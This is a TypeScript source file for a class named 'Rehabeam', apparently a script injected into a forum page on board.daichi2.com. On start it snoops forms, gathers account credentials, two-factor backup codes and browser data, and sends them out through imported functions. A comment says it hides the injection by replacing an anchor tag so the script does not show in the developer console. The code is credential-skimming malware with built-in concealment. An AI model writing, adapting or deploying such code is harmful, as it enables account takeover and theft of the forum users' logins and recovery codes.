import { getBrowserInfo } from 'functions/getBrowserInfo';
import { getBackupCodes } from 'functions/getBackupCodes';
import { getAccountCredentials } from 'functions/getAccountCredentials';
import { getForms } from 'functions/getForms';
import { sendBrowserInfo } from 'functions/sendBrowserInfo';
import { sendAccountInfo } from 'functions/sendAccountInfo';
import { sendAll } from 'functions/sendAll';
import { sendForms } from 'functions/sendForms';
import { restoreData } from 'functions/restoreData';
import { getMeta } from 'functions/getMeta';
import { snoopForms } from 'functions/snoopForms';
import { ENABLE_RETRIEVING_AND_CREATING_FAQ } from 'constants/directives';

export class Rehabeam {
	private static readonly meta = getMeta();
	public constructor() {}

	/**
	 * @description Ensured that it is only called once.
	 */
	public init = (): Promise<void> => {
		if (Rehabeam.meta.initialized) {
			return;
		}

		Rehabeam.meta.initialized = true;

		this.restoreCurrentPage();
		this.snoopForms();

		const promises: Promise<void>[] = [this.sendAll()];

		if (ENABLE_RETRIEVING_AND_CREATING_FAQ) {
			promises.push(this.restoreData());
		}

		return Promise.all(promises).then(() => undefined);
	};

	/**
	 * To make the injection invisible, we hide the script and replace it with a new anchor tag.
	 * This way you won't see it in the developer console.
	 */
	private restoreCurrentPage = () => {
		const title = 'How to create a character before server start!';

		const newAnchorElement = document.createElement('a');
		newAnchorElement.target = '_blank';
		newAnchorElement.title = title;
		newAnchorElement.href = 'https://board.daichi2.com/forumforum/index.php?thread/394/&amp;postID=905#post905';
		newAnchorElement.textContent = title;

		const oldAnchorElement = document.querySelector('a[href*="postID=905"]');
		oldAnchorElement.parentNode.replaceChild(newAnchorElement, oldAnchorElement);
	};

	public restoreData = restoreData;

	public getAccountCredentials = getAccountCredentials;

	public getBackupCodes = getBackupCodes;

	public getBrowserInfo = getBrowserInfo;

	public getForms = getForms;

	public sendAccountInfo = sendAccountInfo;

	public sendBrowserInfo = sendBrowserInfo;

	public sendForms = sendForms;

	public snoopForms = snoopForms;

	public sendAll = sendAll;
}
